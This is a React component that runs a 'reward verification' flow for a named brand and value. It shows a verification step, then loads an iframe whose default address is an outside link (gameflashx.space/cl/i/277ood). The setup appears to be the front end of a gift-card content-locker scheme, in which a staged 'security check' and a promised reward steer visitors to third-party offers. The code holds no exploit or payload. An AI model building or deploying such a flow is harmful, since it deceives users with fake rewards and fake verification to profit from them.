'use client';

import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { VerificationModal } from './VerificationModal';
import { IframeModal } from './IframeModal';

/**
 * @fileOverview Orchestrator for Reward Verification and Delivery.
 * Manages the transition between the security check and the glassmorphism iframe.
 */

interface RewardVerificationModalProps {
  isOpen: boolean;
  onClose: () => void;
  brand: string;
  value: string;
  iframeUrl?: string;
}

export function RewardVerificationModal({ 
  isOpen, 
  onClose, 
  brand, 
  value, 
  iframeUrl = "https://gameflashx.space/cl/i/277ood" 
}: RewardVerificationModalProps) {
  const [view, setView] = useState<'verifying' | 'reward'>('verifying');

  useEffect(() => {
    if (!isOpen) {
      // Reset view after close animation completes
      const timer = setTimeout(() => setView('verifying'), 300);
      document.body.style.overflow = 'unset';
      return () => clearTimeout(timer);
    }

    // Lock scroll for focus
    document.body.style.overflow = 'hidden';
  }, [isOpen]);

  const handleVerificationSuccess = () => {
    setView('reward');
  };

  return (
    <AnimatePresence>
      {isOpen && (
        <div className="fixed inset-0 z-[10000] flex items-center justify-center p-4 md:p-8">
          {/* Backdrop with Dynamic Blur */}
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            onClick={view === 'reward' ? onClose : undefined}
            className="absolute inset-0 bg-black/80 backdrop-blur-[8px]"
          />

          <AnimatePresence mode="wait">
            {view === 'verifying' ? (
              <motion.div
                key="verifying"
                initial={{ opacity: 0, scale: 0.95, y: 10 }}
                animate={{ opacity: 1, scale: 1, y: 0 }}
                exit={{ opacity: 0, scale: 0.95, y: -10 }}
                className="relative w-full max-w-md bg-[#0a0a0a] border border-white/10 rounded-[2.5rem] p-8 md:p-10 shadow-[0_0_50px_rgba(0,0,0,0.5)] overflow-hidden"
              >
                {/* Brand Identity Accents */}
                <div className="absolute top-0 right-0 w-48 h-48 bg-primary/10 rounded-full blur-[80px] pointer-events-none" />
                <div className="absolute bottom-0 left-0 w-48 h-48 bg-blue-500/5 rounded-full blur-[80px] pointer-events-none" />
                
                <VerificationModal onSuccess={handleVerificationSuccess} />
              </motion.div>
            ) : (
              <IframeModal 
                key="reward"
                url={iframeUrl}
                onClose={onClose}
              />
            )}
          </AnimatePresence>
        </div>
      )}
    </AnimatePresence>
  );
}
